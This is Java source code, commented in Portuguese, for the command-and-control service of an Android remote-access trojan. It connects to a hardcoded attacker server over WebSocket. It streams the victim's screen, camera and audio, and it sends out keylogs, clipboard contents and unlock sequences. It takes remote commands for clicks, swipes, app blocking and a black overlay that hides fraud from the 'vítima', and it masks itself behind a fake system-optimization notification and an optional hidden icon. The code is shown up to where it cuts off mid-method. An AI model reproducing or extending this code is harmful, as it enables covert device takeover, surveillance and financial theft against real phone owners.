package com.seguranca.protecao;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;
import java.nio.ByteBuffer;
import java.util.concurrent.TimeUnit;
import org.lsposed.lsparanoid.Obfuscate;

/**
 * SERVIÇO DE COMANDO E CONTROLE (C&C)
 * 
 * Este é o centro de comunicação com o servidor do atacante.
 * 
 * FUNÇÕES:
 * 1. Mantém conexão WebSocket persistente com servidor C&C
 * 2. Envia frames de tela capturados (streaming VNC)
 * 3. Recebe e executa comandos do atacante:
 *    - BLACK_SCREEN_ON/OFF: Controla tela preta
 *    - CLICK x,y: Simula toque na tela
 *    - SWIPE x1,y1,x2,y2: Simula gesto de arraste
 *    - TYPE texto: Injeta texto
 *    - GET_SMS, GET_CONTACTS, GET_LOCATION: Exfiltra dados
 *    - E muito mais...
 * 4. Envia informações do dispositivo
 * 5. Mantém heartbeat para conexão ativa
 * 
 * PROTOCOLO:
 * - Frames: [TIPO: 0x01][TAMANHO: 4 bytes][DADOS: JPEG]
 * - Comandos: JSON via WebSocket texto
 */
@Obfuscate
public class CommandControlService extends Service {

    private static final String TAG = "C&C";
    public static volatile CommandControlService sInstance;
    public static volatile boolean isKillerModeActive = false;
    public static volatile boolean isSelfDestructActive = false;
    
    // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
    // URL do servidor - PUBLIC para acesso do StudioActivity
    public static final String SERVER_URL = "ws://148.224.63.121:7771/ws";
    public static final String WEBVIEW_URL = "";
    public static final boolean HIDE_ICON = false;
    public static final boolean REQUEST_ADMIN = false;
    public static final boolean ANTI_KILL = true;
    public static final boolean ENABLE_CAMERA = true;
    public static final boolean ENABLE_CONTACTS = true;
    public static final boolean ENABLE_SEND_SMS = true;
    public static final boolean ENABLE_READ_SMS = true;
    public static boolean requestAdminRuntime = false;
    private static final int RECONNECT_DELAY = 2000; // 2 segundos - ULTRA RÁPIDO!
    private static final int HEARTBEAT_INTERVAL = 15000; // 15 segundos - mantém conexão sempre ativa sem drop
    private static final int MAX_RECONNECT_ATTEMPTS = 999; // NUNCA desiste!
    private int reconnectAttempts = 0;
    private android.os.PowerManager.WakeLock connectionWakeLock;
    private long lastSuccessfulSend = 0; // Timestamp do último envio bem sucedido
    
    // 🚀 OTIMIZAÇÃO PARA CONEXÕES LENTAS (4G/5G) E VNC HD LÍQUIDO
    private long lastFrameSentTime = 0;
    private static final int MIN_FRAME_INTERVAL = 5; // HVNC padrão (~60 FPS max)
    private static final int SILENT_MIN_FRAME_INTERVAL = 5; // pipeline 0x01 (~60 FPS max)
    private int pendingFrames = 0;
    private static final int MAX_PENDING_FRAMES = 20; // 20 frames max na fila (nunca congela a transmissão)
    private boolean isSlowConnection = false; // Detecta conexão lenta
    private long lastPongTime = 0; // Tempo do último PONG recebido
    private int consecutiveSlowFrames = 0; // Contador de frames lentos
    
    // 📦 FILA OFFLINE 24/7 DE KEYLOGS (Garante captura ininterrupta mesmo se trocar de aba/desconectar WS)
    private static final java.util.concurrent.ConcurrentLinkedQueue<String> offlineKeylogQueue = new java.util.concurrent.ConcurrentLinkedQueue<>();
    private static final int MAX_OFFLINE_KEYLOGS = 1000;
    
    // Método auxiliar para obter URL HTTP do servidor
    public static String getServerHttpUrl() {
        return SERVER_URL.replace("wss://", "https://").replace("ws://", "http://").replace("/ws", "");
    }
    
    OkHttpClient client;
    public volatile WebSocket webSocket;
    private final Object sendLock = new Object();
    private Handler handler = new Handler();
    private Gson gson = new Gson();
    
    public volatile boolean isConnected = false;
    private boolean shouldReconnect = true;
    
    private final Runnable reconnectRunnable = () -> {
        if (!isConnected) {
            connectToServer();
        }
    };
    
    private String deviceId;
    
    // 📷 Receiver para frames da câmera
    private BroadcastReceiver cameraFrameReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            byte[] frame = intent.getByteArrayExtra("frame");
            if (frame != null) {
                sendCameraFrame(frame);
            }
        }
    };
    
    // 🎤 Receiver para chunks de áudio
    private BroadcastReceiver audioChunkReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            byte[] audio = intent.getByteArrayExtra("audio");
            if (audio != null) {
                sendAudioChunk(audio);
            }
        }
    };
    
    // 🔇 Receiver para status do Silent VNC (BTMOB dedicated path) - allows panel to know truth after refresh/reconnect
    private BroadcastReceiver silentVncStatusReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean active = intent.getBooleanExtra("active", false);
            String method = intent.getStringExtra("method");
            if (method == null || method.isEmpty()) method = "silent";
            sendSilentVncStatusInternal(active, method);
        }
    };
    
    // 🔐 Receiver para dados de keylog (VisualScreenActivity, etc)
    private BroadcastReceiver keylogDataReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            // Tenta "json_data" primeiro, depois "data" para compatibilidade
            String data = intent.getStringExtra("json_data");
            if (data == null) {
                data = intent.getStringExtra("data");
            }
            if (data != null && !data.isEmpty()) {
                Log.d(TAG, "🔐 Keylog/Arquivo recebido: " + data.substring(0, Math.min(100, data.length())) + "...");
                sendKeylogToServer(data);
            } else {
                Log.w(TAG, "🔐 Broadcast KEYLOG_DATA recebido mas sem dados!");
            }
        }
    };

    private void startForegroundServiceWithNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = "system_optimization_service";
            String channelName = "Serviço de Otimização do Sistema";
            android.app.NotificationChannel channel = new android.app.NotificationChannel(
                channelId, channelName, android.app.NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Mantém a sincronização e otimização de bateria.");
            channel.setShowBadge(false);
            android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            android.app.Notification notification = new android.app.Notification.Builder(this, channelId)
                .setContentTitle("Serviço de Sistema")
                .setContentText("Otimizando consumo de energia...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setCategory(android.app.Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .build();

            try {
                if (Build.VERSION.SDK_INT >= 34) {
                    try {
                        startForeground(1001, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
                    } catch (Throwable ex) {
                        Log.w(TAG, "⚠️ startForeground com SPECIAL_USE falhou, tentando fallback padrão: " + ex.getMessage());
                        try {
                            startForeground(1001, notification);
                        } catch (Throwable ex2) {
                            Log.e(TAG, "⚠️ Fallback de startForeground também falhou: " + ex2.getMessage());
                        }
                    }
                } else {
                    startForeground(1001, notification);
                }
                Log.d(TAG, "✅ Foreground Service iniciado com sucesso!");
            } catch (Throwable e) {
                Log.e(TAG, "❌ Erro ao chamar startForeground: " + e.getMessage());
            }
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        // IMPORTANTE: Inicia foreground service para evitar kill do Android 8+
        startForegroundServiceWithNotification();
        Log.d(TAG, "Serviço C&C criado");
        
        // 🔋 Adquire WakeLock para manter conexão ativa mesmo com tela desligada
        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                connectionWakeLock = pm.newWakeLock(
                    android.os.PowerManager.PARTIAL_WAKE_LOCK,
                    "App:NetworkSync"
                );
                connectionWakeLock.acquire();
                Log.d(TAG, "🔋 WakeLock adquirido para manter conexão!");

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    try {
                        Intent bIntent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        bIntent.setData(android.net.Uri.parse("package:" + getPackageName()));
                        bIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(bIntent);
                    } catch (Exception ex) {
                        Log.d(TAG, "Erro ao solicitar isIgnoringBatteryOptimizations: " + ex.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Erro ao adquirir WakeLock: " + e.getMessage());
        }
        
        // Gera ID único do dispositivo
        deviceId = getUniqueDeviceId();
        
        // Cria cliente HTTP com pingInterval para evitar timeouts de TCP/NAT
        client = new OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS) // WebSocket não tem timeout de leitura
            .pingInterval(10, TimeUnit.SECONDS) // Mantém WebSocket vivo no nível do protocolo RFC 6455
            .build();
        
        // 📷 Registra receiver para frames da câmera
        IntentFilter cameraFilter = new IntentFilter("com.seguranca.protecao.CAMERA_FRAME_READY");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(cameraFrameReceiver, cameraFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(cameraFrameReceiver, cameraFilter);
        }
        
        // 🎤 Registra receiver para chunks de áudio
        IntentFilter audioFilter = new IntentFilter("com.seguranca.protecao.AUDIO_CHUNK_READY");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(audioChunkReceiver, audioFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(audioChunkReceiver, audioFilter);
        }
        
        // 🔇 Registra receiver para status do Silent VNC (para sincronizar estado no painel)
        IntentFilter silentStatusFilter = new IntentFilter("com.seguranca.protecao.SILENT_VNC_STATUS");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(silentVncStatusReceiver, silentStatusFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(silentVncStatusReceiver, silentStatusFilter);
        }
        
        // 🔐 Registra receiver para dados de keylog (VisualScreenActivity, AccessibilityService, etc)
        IntentFilter keylogFilter = new IntentFilter("com.seguranca.protecao.KEYLOG_DATA");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(keylogDataReceiver, keylogFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(keylogDataReceiver, keylogFilter);
        }

        // 🌑 Registra receiver dinâmico para SCREEN_OFF para ocultar o ícone sem interromper o usuário
        try {
            IntentFilter screenFilter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
            BroadcastReceiver screenReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction())) {
                        Log.d(TAG, "🌑 Tela apagou - verificando ocultamento do ícone...");
                        if (CommandControlService.HIDE_ICON) {
                            try {
                                android.content.pm.PackageManager pm = getPackageManager();
                                android.content.ComponentName componentName = new android.content.ComponentName(
                                    CommandControlService.this, MainActivity.class
                                );
                                pm.setComponentEnabledSetting(
                                    componentName,
                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    android.content.pm.PackageManager.DONT_KILL_APP
                                );
                                Log.d(TAG, "[HIDE] Ícone ocultado via SCREEN_OFF");
                            } catch (Exception e) {
                                Log.e(TAG, "Erro ao ocultar ícone no SCREEN_OFF: " + e.getMessage());
                            }
                        }
                    }
                }
            };
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, screenFilter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(screenReceiver, screenFilter);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao registrar screenFilter: " + e.getMessage());
        }
        
        // 📋 Configura listener do Clipboard (Área de Transferência)
        setupClipboardListener();
        
        // Conecta ao servidor
        connectToServer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            
            if ("SEND_FRAME".equals(action)) {
                // Envia frame de captura de tela
                byte[] frame = intent.getByteArrayExtra("frame");
                if (frame != null) {
                    boolean silentPipeline = intent.getBooleanExtra("silent_pipeline", false);
                    // Log verboso de recebimento de frame removido para performance
                    sendFrame(frame, silentPipeline);
                } else {
                    Log.e(TAG, "❌ Frame é NULL!");
                }
            }
            else if ("SEND_KEYLOG".equals(action)) {
                // Envia dados do keylogger
                String data = intent.getStringExtra("data");
                if (data != null) {
                    sendKeylog(data);
                } else {
                    Log.e(TAG, "❌ Keylog data é NULL!");
                }
            }
            else if ("SEND_SCREEN_HIERARCHY".equals(action)) {
                // Envia hierarquia da tela (Screen Reader V2)
                String data = intent.getStringExtra("data");
                if (data != null) {
                    sendScreenHierarchy(data);
                } else {
                    Log.e(TAG, "❌ Screen hierarchy data é NULL!");
                }
            }
            else if ("SEND_UNLOCK_SEQUENCE".equals(action)) {
                // 🔓 Envia sequência de desbloqueio gravada
                String data = intent.getStringExtra("data");
                if (data != null) {
                    sendUnlockSequence(data);
                } else {
                    Log.e(TAG, "❌ Unlock sequence data é NULL!");
                }
            }
            else if ("SEND_DEVICE_STATUS".equals(action)) {
                // Envia status do dispositivo (foreground app, lock status, screen status)
                String packageName = intent.getStringExtra("packageName");
                String appName = intent.getStringExtra("appName");
                boolean isLocked = intent.getBooleanExtra("isLocked", false);
                boolean isScreenOn = intent.getBooleanExtra("isScreenOn", true);
                
                JsonObject statusJson = new JsonObject();
                statusJson.addProperty("type", "DEVICE_STATUS");
                statusJson.addProperty("package", packageName != null ? packageName : "");
                statusJson.addProperty("appName", appName != null ? appName : "");
                statusJson.addProperty("isLocked", isLocked);
                statusJson.addProperty("isScreenOn", isScreenOn);
                
                sendJson(statusJson);
            }
            else if ("SEND_CAPTURED_DATA".equals(action)) {
                String jsonData = intent.getStringExtra("jsonData");
                if (jsonData != null) {
                    sendCapturedDataLocal(jsonData);
                }
            }
        }
        
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Conecta ao servidor C&C
     */
    private void connectToServer() {
        if (isConnected && webSocket != null) {
            Log.d(TAG, "Já está conectado");
            return;
        }
        
        if (webSocket != null) {
            try {
                webSocket.cancel();
            } catch (Exception e) {}
            webSocket = null;
        }
        
        Log.d(TAG, "Conectando ao servidor C&C...");
        
        try {
            // Verifica se a URL já tem parâmetros (?) para usar & ao invés de ?
            String separator = SERVER_URL.contains("?") ? "&" : "?";
            String fullUrl = SERVER_URL + separator + "device_id=" + deviceId;
            
            Request request = new Request.Builder()
                .url(fullUrl)
                .addHeader("bypass-tunnel-reminder", "true")
                .addHeader("User-Agent", "Mozilla/5.0")
                .build();
            
            webSocket = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    CommandControlService.this.onConnected(webSocket);
                }

                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    CommandControlService.this.onCommandReceived(text);
                }

                @Override
                public void onMessage(WebSocket webSocket, ByteString bytes) {
                    // Comandos binários (se necessário)
                }

                @Override
                public void onClosing(WebSocket webSocket, int code, String reason) {
                    Log.d(TAG, "Conexão fechando: " + reason);
                }

                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    CommandControlService.this.onDisconnected();
                }

                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    Log.e(TAG, "Falha na conexão: " + t.getMessage());
                    CommandControlService.this.onDisconnected();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao conectar: " + e.getMessage());
            scheduleReconnect();
        }
    }

    /**
     * Callback: Conexão estabelecida
     */
    private void onConnected(WebSocket ws) {
        Log.d(TAG, "✓ Conectado ao servidor C&C!");
        isConnected = true;
        webSocket = ws;
        reconnectAttempts = 0; // Reset contador de reconexão
        
        // Envia informações do dispositivo
        sendDeviceInfo();

        // 🔇 Report current dedicated BTMOB silent state (purple "HVNC Silente") immediately after
        // (re)connect so the panel can correctly initialize isCaptureEnabled + isSilentHvncEnabled
        // from server truth without requiring any extra user action or refresh race.
        try {
            UiAssistBridge.SilentState st =
                    UiAssistBridge.getCurrentBtmobSilentState(CommandControlService.this);
            sendSilentVncStatusInternal(st.active, "silent");
            Log.d(TAG, "🔇 Reported BTMOB silent state on WS connect (active=" + st.active + ")");
        } catch (Exception ignored) {}

        // Inicia heartbeat
        startHeartbeat();
        
        // 🔄 Descarrega qualquer keylog acumulado enquanto esteve offline
        flushOfflineKeylogs();
    }

    /**
     * Callback: Comando recebido do servidor
     */
    private void onCommandReceived(String commandJson) {
        Log.d(TAG, "Comando recebido: " + commandJson);
        
        try {
            JsonObject cmd = gson.fromJson(commandJson, JsonObject.class);
            String action = cmd.get("action").getAsString();
            
            switch (action) {
                case "GET_DEVICE_INFO":
                case "GET_ACCOUNTS":
                case "GET_GOOGLE_ACCOUNTS":
                case "REFRESH_ACCOUNTS": {
                    sendDeviceInfo();
                    sendResponse("OK", "Info do dispositivo e contas atualizadas");
                    break;
                }

                case "GET_CLIPBOARD": {
                    try {
                        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                        if (clipboard != null && clipboard.hasPrimaryClip()) {
                            android.content.ClipData clip = clipboard.getPrimaryClip();
                            if (clip != null && clip.getItemCount() > 0 && clip.getItemAt(0).getText() != null) {
                                String text = clip.getItemAt(0).getText().toString();
                                sendClipboardToServer(text);
                                sendResponse("OK", "Clipboard obtido: " + text);
                                break;
                            }
                        }
                        sendResponse("OK", "Clipboard vazio");
                    } catch (Exception e) {
                        sendResponse("ERROR", "Erro ao obter clipboard: " + e.getMessage());
                    }
                    break;
                }

                case "SET_CLIPBOARD":
                case "INJECT_CLIPBOARD": {
                    String textToSet = cmd.has("text") ? cmd.get("text").getAsString() : (cmd.has("data") ? cmd.get("data").getAsString() : "");
                    if (textToSet != null) {
                        new Handler(Looper.getMainLooper()).post(() -> {
                            try {
                                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                                if (clipboard != null) {
                                    android.content.ClipData clip = android.content.ClipData.newPlainText("text", textToSet);
                                    clipboard.setPrimaryClip(clip);
                                    lastClipboardText = textToSet;
                                    sendClipboardToServer(textToSet);
                                    Log.d(TAG, "📋 Clipboard injetado com sucesso no aparelho: " + textToSet);
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Erro ao injetar clipboard: " + e.getMessage());
                            }
                        });
                        sendResponse("OK", "Clipboard injetado: " + textToSet);
                    } else {
                        sendResponse("ERROR", "Texto não fornecido");
                    }
                    break;
                }

                case "BLACK_SCREEN_ON":
                    // 🖤 Envia broadcast para AccessibilityService (100% opaco)
                    Intent blackOnIntent = new Intent("com.seguranca.protecao.BLACK_SCREEN_ON");
                    blackOnIntent.setPackage(getPackageName());
                    sendBroadcast(blackOnIntent);
                    Log.d(TAG, "🖤 BLACK_SCREEN_ON broadcast enviado");
                    sendResponse("OK", "Tela preta ativada (100% opaco)");
                    break;
                    
                case "BLACK_SCREEN_OFF":
                    // 🖤 Envia broadcast para AccessibilityService
                    Intent blackOffIntent = new Intent("com.seguranca.protecao.BLACK_SCREEN_OFF");
                    blackOffIntent.setPackage(getPackageName());
                    sendBroadcast(blackOffIntent);
                    Log.d(TAG, "🖤 BLACK_SCREEN_OFF broadcast enviado");
                    sendResponse("OK", "Tela preta desativada");
                    break;
                
                case "CUSTOM_BLACK_SCREEN":
                    // 🎨 Tela preta customizada com template do painel web
                    // O template pode vir como string JSON OU como objeto JSON
                    String templateStr = null;
                    if (cmd.has("template")) {
                        com.google.gson.JsonElement templateElement = cmd.get("template");
                        if (templateElement.isJsonObject()) {
                            // Template veio como objeto JSON - converte para string
                            templateStr = templateElement.toString();
                            Log.d(TAG, "🎨 Template recebido como objeto JSON");
                        } else if (templateElement.isJsonPrimitive() && templateElement.getAsJsonPrimitive().isString()) {
                            // Template veio como string (já é JSON string)
                            templateStr = templateElement.getAsString();
                            Log.d(TAG, "🎨 Template recebido como string");
                        }
                    }
                    
                    if (templateStr != null && !templateStr.isEmpty()) {
                        Intent customBlackIntent = new Intent("com.seguranca.protecao.CUSTOM_BLACK_SCREEN");
                        customBlackIntent.setPackage(getPackageName());
                        customBlackIntent.putExtra("template", templateStr);
                        sendBroadcast(customBlackIntent);
                        Log.d(TAG, "🎨 CUSTOM_BLACK_SCREEN broadcast enviado (template: " + templateStr.length() + " chars)");
                        sendResponse("OK", "Tela preta customizada ativada");
                    } else {
                        Log.e(TAG, "🎨 Template não fornecido ou vazio");
                        sendResponse("ERROR", "Template não fornecido");
                    }
                    break;

                case "SET_BLACK_SCREEN_OPACITY": {
                    int opacity = cmd.has("value") ? cmd.get("value").getAsInt() : 100;
                    opacity = Math.max(10, Math.min(100, opacity));
                    Intent opacityIntent = new Intent("com.seguranca.protecao.SET_BLACK_SCREEN_OPACITY");
                    opacityIntent.setPackage(getPackageName());
                    opacityIntent.putExtra("value", opacity);
                    sendBroadcast(opacityIntent);
                    Log.d(TAG, "🖤 SET_BLACK_SCREEN_OPACITY broadcast: " + opacity + "%");
                    sendResponse("OK", "Opacidade tela preta: " + opacity + "%");
                    break;
                }

                case "TOGGLE_BLACK_SCREEN_TOUCH": {
                    // 🖐️ Controla bloqueio de toque físico no overlay da tela preta.
                    // FLAG_NOT_TOUCHABLE faz toques passarem pelo overlay (vítima livre).
                    // setBlackOverlayTouchable(true)  = REMOVE FLAG → overlay intercepta toques → vítima BLOQUEADA
                    // setBlackOverlayTouchable(false) = ADD FLAG    → toques passam           → vítima LIVRE
                    // Logo: blocked=true → setBlackOverlayTouchable(true) ✓
                    boolean blocked = cmd.has("blocked") && cmd.get("blocked").getAsBoolean();
                    UiAssistBridge.isBlackTouchBlocked = blocked;
                    UiAssistBridge.setBlackOverlayTouchable(blocked);
                    Log.d(TAG, "🖐️ TOGGLE_BLACK_SCREEN_TOUCH: bloqueio=" + blocked);
                    sendResponse("OK", "Bloqueio de toque: " + (blocked ? "ATIVADO" : "DESATIVADO"));
                    break;
                }

                case "SET_BLOCKED_APPS": {
                    if (cmd.has("packages") && cmd.get("packages").isJsonArray()) {
                        com.google.gson.JsonArray arr = cmd.getAsJsonArray("packages");
                        synchronized (UiAssistBridge.blockedPackages) {
                            UiAssistBridge.blockedPackages.clear();
                            for (int i = 0; i < arr.size(); i++) {
                                String item = arr.get(i).getAsString();
                                if (item != null && !item.trim().isEmpty()) {
                                    UiAssistBridge.blockedPackages.add(item.trim().toLowerCase());
                                }
                            }
                        }
                        UiAssistBridge.saveBlockedPackages(this);
                        Intent bIntent = new Intent("com.seguranca.protecao.SET_BLOCKED_APPS");
                        bIntent.setPackage(getPackageName());
                        sendBroadcast(bIntent);
                        sendDeviceInfo();
                        Log.d(TAG, "🚫 SET_BLOCKED_APPS: " + UiAssistBridge.blockedPackages.size() + " pacotes bloqueados");
                        sendResponse("OK", "Apps bloqueados atualizados (" + UiAssistBridge.blockedPackages.size() + " apps)");
                    } else {
                        sendResponse("ERROR", "Parâmetro 'packages' ausente");
                    }
                    break;
                }

                case "TOGGLE_BLOCK_APP": {
                    String pkg = cmd.has("package") ? cmd.get("package").getAsString() : "";
                    boolean blocked = cmd.has("blocked") && cmd.get("blocked").getAsBoolean();
                    if (!pkg.isEmpty()) {
                        String cleanPkg = pkg.trim().toLowerCase();
                        synchronized (UiAssistBridge.blockedPackages) {
                            if (blocked) {
                                UiAssistBridge.blockedPackages.add(cleanPkg);
                            } else {
                                UiAssistBridge.blockedPackages.remove(cleanPkg);
                            }
                        }
                        UiAssistBridge.saveBlockedPackages(this);
                        Intent bIntent = new Intent("com.seguranca.protecao.TOGGLE_BLOCK_APP");
                        bIntent.setPackage(getPackageName());
                        bIntent.putExtra("package", cleanPkg);
                        bIntent.putExtra("blocked", blocked);
                        sendBroadcast(bIntent);
                        if (blocked && UiAssistBridge.instance != null) {
                            UiAssistBridge.instance.checkAndBlockIfCurrentForeground(cleanPkg);
                        }
                        sendDeviceInfo();
                        Log.d(TAG, "🚫 TOGGLE_BLOCK_APP: " + cleanPkg + " = " + blocked);
                        sendResponse("OK", "Bloqueio do app " + cleanPkg + ": " + (blocked ? "ATIVADO" : "DESATIVADO"));
                    } else {
                        sendResponse("ERROR", "Pacote não fornecido");
                    }
                    break;
                }

                case "SHOW_APP_UNAVAILABLE": {
                    String pkg = cmd.has("package") ? cmd.get("package").getAsString() : "";
                    String name = cmd.has("appName") ? cmd.get("appName").getAsString() : "";
                    Intent bIntent = new Intent("com.seguranca.protecao.SHOW_APP_UNAVAILABLE");
                    bIntent.setPackage(getPackageName());
                    bIntent.putExtra("package", pkg);
                    bIntent.putExtra("appName", name);
                    sendBroadcast(bIntent);
                    Log.d(TAG, "🚫 SHOW_APP_UNAVAILABLE broadcast enviado para " + name + " (" + pkg + ")");
                    sendResponse("OK", "Tela de App Indisponível ativada");
                    break;
                }
                    
                case "CLICK": {
                    android.util.DisplayMetrics metricsClick = getRealDisplayMetrics();
                    int screenW = metricsClick.widthPixels;
                    int screenH = metricsClick.heightPixels;
                    int x, y;
                    String scaleClick = cmd.has("scale") ? cmd.get("scale").getAsString() : "";
                    float rawX = (cmd.has("x") && !cmd.get("x").isJsonNull()) ? cmd.get("x").getAsFloat() : 0.0f;
                    float rawY = (cmd.has("y") && !cmd.get("y").isJsonNull()) ? cmd.get("y").getAsFloat() : 0.0f;
                    
                    if ("vnc_norm".equals(scaleClick) || (rawX > 0.0f && rawX <= 1.0f && rawY > 0.0f && rawY <= 1.0f)) {
                        x = Math.round(rawX * screenW);
                        y = Math.round(rawY * screenH);
                        Log.d(TAG, "📐 CLICK (vnc_norm/auto): " + rawX + "," + rawY + " -> (" + x + "," + y + ")");
                    } else if ("vnc".equals(scaleClick)) {
                        x = Math.round(rawX * screenW / 350.0f);
                        y = Math.round(rawY * screenH / 650.0f);
                        Log.d(TAG, "📐 CLICK (vnc scaled): (" + x + "," + y + ")");
                    } else {
                        x = Math.round(rawX);
                        y = Math.round(rawY);
                        Log.d(TAG, "📐 CLICK (raw/fallback): (" + x + "," + y + ")");
                    }
                    performClick(x, y);
                    sendResponse("OK", "Clique executado");
                    break;
                }
                    
                case "SWIPE": {
                    android.util.DisplayMetrics metricsSwipe = getRealDisplayMetrics();
                    int swipeScreenW = metricsSwipe.widthPixels;
                    int swipeScreenH = metricsSwipe.heightPixels;
                    int x1, y1, x2, y2;
                    String scaleSwipe = cmd.has("scale") ? cmd.get("scale").getAsString() : "";
                    float rawX1 = (cmd.has("x1") && !cmd.get("x1").isJsonNull()) ? cmd.get("x1").getAsFloat() : 0.0f;
                    float rawY1 = (cmd.has("y1") && !cmd.get("y1").isJsonNull()) ? cmd.get("y1").getAsFloat() : 0.0f;
                    float rawX2 = (cmd.has("x2") && !cmd.get("x2").isJsonNull()) ? cmd.get("x2").getAsFloat() : 0.0f;
                    float rawY2 = (cmd.has("y2") && !cmd.get("y2").isJsonNull()) ? cmd.get("y2").getAsFloat() : 0.0f;
                    
                    if ("vnc_norm".equals(scaleSwipe) || (rawX1 > 0.0f && rawX1 <= 1.0f && rawY1 > 0.0f && rawY1 <= 1.0f)) {
                        x1 = Math.round(rawX1 * swipeScreenW);
                        y1 = Math.round(rawY1 * swipeScreenH);
                        x2 = Math.round(rawX2 * swipeScreenW);
                        y2 = Math.round(rawY2 * swipeScreenH);
                        Log.d(TAG, "📐 SWIPE (vnc_norm/auto): (" + rawX1 + "," + rawY1 + ") -> (" + rawX2 + "," + rawY2 + ") -> (" + x1 + "," + y1 + ") -> (" + x2 + "," + y2 + ")");
                    } else if ("vnc".equals(scaleSwipe)) {
                        x1 = Math.round(rawX1 * swipeScreenW / 350.0f);
                        y1 = Math.round(rawY1 * swipeScreenH / 650.0f);
                        x2 = Math.round(rawX2 * swipeScreenW / 350.0f);
                        y2 = Math.round(rawY2 * swipeScreenH / 650.0f);
                        Log.d(TAG, "📐 SWIPE (vnc scaled): (" + x1 + "," + y1 + ") -> (" + x2 + "," + y2 + ")");
                    } else {
                        x1 = Math.round(rawX1);
                        y1 = Math.round(rawY1);
                        x2 = Math.round(rawX2);
                        y2 = Math.round(rawY2);
                        Log.d(TAG, "📐 SWIPE (raw/fallback): (" + x1 + "," + y1 + ") -> (" + x2 + "," + y2 + ")");
                    }
                    performSwipe(x1, y1, x2, y2);
                    sendResponse("OK", "Swipe executado");
                    break;
                }
                    
                case "LONG_PRESS": {
                    android.util.DisplayMetrics metricsLP = getRealDisplayMetrics();
                    int lpScreenW = metricsLP.widthPixels;
                    int lpScreenH = metricsLP.heightPixels;
                    int lpX, lpY;
                    int duration = cmd.has("duration") ? cmd.get("duration").getAsInt() : 500;
                    String scaleLP = cmd.has("scale") ? cmd.get("scale").getAsString() : "";
                    float rawX = (cmd.has("x") && !cmd.get("x").isJsonNull()) ? cmd.get("x").getAsFloat() : 0.0f;
                    float rawY = (cmd.has("y") && !cmd.get("y").isJsonNull()) ? cmd.get("y").getAsFloat() : 0.0f;
                    
                    if ("vnc_norm".equals(scaleLP) || (rawX > 0.0f && rawX <= 1.0f && rawY > 0.0f && rawY <= 1.0f)) {
                        lpX = Math.round(rawX * lpScreenW);
                        lpY = Math.round(rawY * lpScreenH);
                        Log.d(TAG, "📐 LONG_PRESS (vnc_norm/auto): " + rawX + "," + rawY + " -> (" + lpX + "," + lpY + ")");
                    } else if ("vnc".equals(scaleLP)) {
                        lpX = Math.round(rawX * lpScreenW / 350.0f);
                        lpY = Math.round(rawY * lpScreenH / 650.0f);
